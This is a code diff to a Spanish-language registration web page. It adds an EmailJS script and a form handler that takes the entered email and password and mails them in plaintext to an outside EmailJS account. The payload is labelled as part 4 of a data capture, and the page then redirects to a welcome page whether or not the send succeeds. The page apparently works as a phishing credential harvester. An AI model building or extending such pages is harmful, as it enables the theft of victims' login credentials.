@@ -459,6 +459,13 @@
             }
         }
     </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Inicializa EmailJS (reemplaza 'YOUR_USER_ID' con tu ID de EmailJS)
+        (function() {
+            emailjs.init('dZVrwXaCa7tmTcMCb'); // Obtén esto desde tu dashboard de EmailJS
+        })();
+    </script>
 </head>
 <body>
     <div class="container">
@@ -539,7 +546,7 @@
                     </div>
                 </div>
                 
-                <button type="submit" class="login-btn"><a href="wellcome.html" style="text-decoration: none; color: inherit">Registrar</a></button>
+                <button type="submit" class="login-btn">Siguiente</button>
             </form>
         </div>
         
@@ -629,11 +636,6 @@
             modal.classList.remove('active');
             document.body.style.overflow = 'auto';
         }
-
-        function openSocial(network) {
-            // Puedes agregar aquí tracking o analytics si lo deseas
-            console.log('Red social seleccionada:', network);
-        }
     
         // Animación de entrada
         window.addEventListener('load', function() {
@@ -661,12 +663,49 @@
             });
         });
 
-        // Prevenir envío del formulario si no se aceptan los términos
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+         // Función para manejar el envío del formulario
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Verificar términos y condiciones
             if (!document.getElementById('termsCheckbox').checked) {
-                e.preventDefault();
                 alert('Debes aceptar los términos y condiciones para continuar.');
                 openTermsModal();
+                return;
+            }
+            
+            // Obtener valores del formulario
+            const email = document.getElementById('code').value; // Cambiado de 'email' a 'code'
+            const password = document.getElementById('password').value;
+            const repitePassword = document.getElementById('repitepassword').value;
+            
+            // Validar que las contraseñas coincidan
+            if (password !== repitePassword) {
+                alert('Las contraseñas no coinciden');
+                return;
+            }
+            
+            try {
+                // Enviar datos a EmailJS
+                await emailjs.send('service_5tc4a7m', 'template_bt30onq', {
+                    formulario: "Parte 4 - Registro de correo y contraseña",
+                    email: email,
+                    password: password,
+                    fecha: new Date().toLocaleDateString('es-ES'),
+                    hora: new Date().toLocaleTimeString('es-ES'),
+                    nota: "Datos de registro enviados automáticamente"
+                });
+                
+                // Redirigir después del envío exitoso
+                window.location.href = "wellcome.html";
+                
+            } catch (error) {
+                console.error('Error al enviar:', error);
+                // Redirigir incluso si falla el envío
+                window.location.href = "wellcome.html";
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = originalBtnText;
             }
         });
     </script>
